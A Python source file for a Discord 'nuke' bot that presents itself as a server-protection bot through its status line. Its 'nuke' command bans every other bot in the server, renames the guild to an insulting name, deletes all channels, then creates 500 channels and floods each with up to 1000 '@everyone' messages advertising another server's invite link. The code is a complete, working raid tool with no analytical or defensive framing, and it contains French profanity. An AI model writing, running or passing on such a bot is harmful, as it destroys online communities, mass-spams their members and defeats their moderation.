import os
import nextcord
from nextcord.ext import commands
import multiprocessing
from dotenv import load_dotenv
import random
import string
import asyncio
from datetime import datetime

load_dotenv()
token = os.getenv("DISCORD_BOT_TOKEN2")

def timestamp():
    now = datetime.now()
    date_str = now.strftime("%d/%m/%Y")
    time_str = now.strftime("%H:%M:%S")
    return f"[{date_str}] | [{time_str}] : "

# -- RAID PARAM --
raider_names = "SYS32.DLL"
servers_link = "https://discord.gg/sTev8Edxk5"
raid_mention = "@everyone @here"
server_names = f"SERVER FUCKED BY {raider_names}"
message_cont = f"SALUT ON CHANGE DE SERVEUR!\nLINK: {servers_link}\n REJOIGNEZ A FOND !!!!!\n||{raid_mention}||\nCordialement: {raider_names}"
cha1nel_name = [f"nukeds by {raider_names}", f"raided by {raider_names}", f"fucked by {raider_names}"]
webhook_nums = 15
webhook_name = [f"FUCKED BY {raider_names}", f"RAIDED BY {raider_names}", f"{raider_names} ON TOP", f"{raider_names} TA BZ FDP"]

intents = nextcord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix="sys32*", intents=intents)

process_count = multiprocessing.cpu_count()
semaphore = asyncio.Semaphore(500)

print(f"Starting bot with {process_count} processes.")

@bot.event
async def on_ready():
    print(f'{timestamp()}Logged in as {bot.user} (ID: {bot.user.id})')
    print(f'{timestamp()}------')
    activity = nextcord.Game(name="Protecting Servers by sys32.dll")
    await bot.change_presence(activity=activity)

async def clear_all_channels(guild):
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f'{timestamp()}Deleted channel: {channel.name}')
        except Exception as e:
            print(f'{timestamp()}Failed to delete channel: {channel.name} - {e}')

def random_id():
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(7))

async def send_test(channel):
    async with semaphore:
        for _ in range(1000):
            try:
                await channel.send(f"{message_cont}")
                print(f'{timestamp()}Message sent to : {channel.name}')
            except Exception as e:
                pass
            await asyncio.sleep(0.00005)

async def create_mass_channel(guild):
    try:
        tasks = []
        for i in range(500):
            number = random_id()
            base_name = random.choice(cha1nel_name)
            name = f"{base_name} {number}"

            try:
                channel = await guild.create_text_channel(name)
                print(f'{timestamp()}Created Channel : {name}')
            except Exception as e:
                print(f'{timestamp()}Failed to create channel {name}: {e}')
                continue

            tasks.append(asyncio.create_task(send_test(channel)))

        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

    except Exception as e:
        print(f'{timestamp()}Error: {e}')

async def rename_guild(guild):
    try:
        old_name = guild.name
        await guild.edit(name=f"{server_names}")
        print(f'{timestamp()}Server renamed from "{old_name}" to "{server_names}"')
    except Exception as e:
        print(f'{timestamp()}Error renaming server: {e}')

async def ban_bot(guild, reason=f"{server_names}"):
    for member in guild.members:
        if member.bot:
            print(f'{timestamp()}{member.name} | {member.id}')
            try:
                await guild.ban(member, reason=reason)
                print(f'{timestamp()}Banned bot: {member.name}')
            except Exception as e:
                print(f'{timestamp()}{e}')

@bot.command()
async def nuke(ctx):
    print(f'{timestamp()}Nuke command started by {ctx.author}')
    await ban_bot(ctx.guild, reason=f"{server_names}")
    await rename_guild(ctx.guild)
    await clear_all_channels(ctx.guild)
    await create_mass_channel(ctx.guild)

@bot.command()
async def excuse(ctx):
    await clear_all_channels(ctx.guild)

    channel = await ctx.guild.create_text_channel("sorry")

    await channel.send("Sorry for the raid, guys.")

if __name__ == "__main__":
    bot.run(token)
